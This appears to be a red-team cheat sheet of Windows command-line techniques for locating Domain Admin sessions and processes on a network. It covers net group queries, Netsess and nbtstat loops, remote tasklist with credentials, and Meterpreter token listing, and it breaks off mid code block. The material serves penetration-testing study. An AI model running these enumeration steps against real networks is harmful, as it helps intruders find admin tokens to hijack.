# Initial Access

### Finding Domain Admin Processes

**Technique 1: Checking Locally**

```python
# Check for Domain Admins user
net group "Domain Admins" /domain

# list processes and process owners, cross reference the task list with the Domain Admin
Tasklist /v
```

 **Technique 2: Querying Domain Controllers for Active Domain User Sessions**

```python
# Gather a list of Domain Controllers from the “Domain Controllers” OU using LDAP queries
net group "Domain Controllers" /domain

# Alternatively, you can look them up via DNS.
nslookup –type=SRV _ldap._tcp.

# Gather a list of all of the active domain sessions by querying each of the domain controllers using Netsess.exe
# Download at http://www.joeware.net/freetools/tools/netsess/index.htm
# It will return the IP Address of the active session, the domain account, the session start time, and the idle time.
# Cross reference the Domain Admin list with the active session list to determine which IP addresses have active domain tokens on them.
Netsess.exe –h

# dcs.txt = list of domain controllers 
# admins.txt = list of Domain Admins. 
FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i && @netsess -h %i 2>nul > sessions.txt &&
FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a

```

**Technique 3: Scanning Remote Systems for Running Tasks**

```python
# enumerate the Domain Admins first
# ips.txt contains a list of the target systems and the names.txt contains a list of the Domain Admins.
FOR /F %i in (ips.txt) DO @echo [+] %i && @tasklist /V /S %i /U user /P password 2>NUL > output.txt &&
FOR /F %n in (names.txt) DO @type output.txt | findstr %n > NUL && echo [!] %n was found running a process on %i && pause
```

**Technique 4: Scanning Remote Systems for NetBIOS Information**

```python
# Some Windows systems still allow users to query for logged in users via the NetBIOS queries.
# Quick and dirty Windows command line script that will scan remote systems for active Domain Admins sessions. 
# Note: The script can be ran as a non-domain user.
for /F %i in (ips.txt) do @echo [+] Checking %i && nbtstat -A %i 2>NUL >nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i

OR

# use the nbtscan tool which runs a little faster
# download nbtscan here, https://www.softpedia.com/get/Network-Tools/Network-IP-Scanner/nbtscan.shtml
for /F %i in (ips.txt) do @echo [+] Checking %i && nbtscan -f %i 2>NUL >nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i
```

**Technique 5: Got Meterpreter?**

```python
meterpreter > load incognito
meterpreter > list_tokens -u
